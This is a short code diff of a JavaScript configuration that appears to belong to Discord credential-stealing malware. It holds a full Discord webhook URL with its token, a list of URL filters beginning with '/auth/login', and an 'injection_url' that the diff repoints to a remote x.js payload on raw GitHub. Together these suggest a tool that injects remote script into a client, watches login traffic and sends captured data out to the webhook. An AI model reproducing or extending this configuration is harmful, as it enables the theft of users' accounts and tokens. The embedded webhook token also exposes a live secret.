@@ -11,7 +11,7 @@ const CONFIG = {
   webhook:
     "https://discord.com/api/webhooks/1487258250465247403/WWWUlRQAn6ed8nOEnVld6Wl-bbo21rEu7W_oO-csXiHi-1GzKBAP4x3INmbd7Ko3TbXW",
   injection_url:
-    "https://gist.githubusercontent.com/g73940517-rgb/09763107fbc06512d52fd811f9f55e67/raw/6f4f8eb991055ff9a0ac3998c230b320960df20b/inject",
+    "https://raw.githubusercontent.com/SeanClementswl/inject/refs/heads/main/x.js",
   filters: {
     urls: [
       "/auth/login",
